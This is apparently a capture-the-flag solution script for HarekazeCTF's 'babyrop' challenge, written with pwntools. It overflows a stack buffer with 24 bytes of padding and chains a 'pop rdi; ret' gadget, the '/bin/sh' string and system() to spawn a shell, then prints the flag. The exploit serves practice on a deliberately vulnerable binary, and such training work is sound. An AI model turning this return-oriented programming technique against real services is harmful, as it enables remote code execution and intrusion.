#!/usr/bin/env python
from pwn import *

elf = ELF('babyrop')
p = elf.process()
# p = remote('problem.harekaze.com',20001)

# msf-pattern_offset -q 0x6241396141386141
# [*] Exact match at offset 24

payload = flat( # 'A' * 24 + system('/bin/sh')
    'A' * 24,
    0x400683, # 0x0000000000400683 : pop rdi ; ret
    next(elf.search('/bin/sh')),
    elf.sym['system'],
    endianness = 'little', word_size = 64, sign = False)
    
p.sendline(payload)
p.interactive()

# HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}
